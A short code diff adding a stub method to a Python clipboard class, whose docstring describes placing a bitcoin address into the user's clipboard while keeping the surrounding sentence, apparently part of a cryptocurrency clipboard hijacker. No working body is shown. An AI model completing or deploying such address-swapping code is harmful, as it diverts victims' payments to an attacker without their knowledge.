@@ -41,3 +41,13 @@ class clipboard:
             return True
         except:
             return False
+        
+    def set_sentence(content: str) -> bool: 
+        """Set a bitcoin address but keep the sentence around it.
+
+        Args:
+            content (str): The text that will be set in the clipboard.
+
+        Returns:
+            bool: If the content could be set on the users clipboard.
+        """
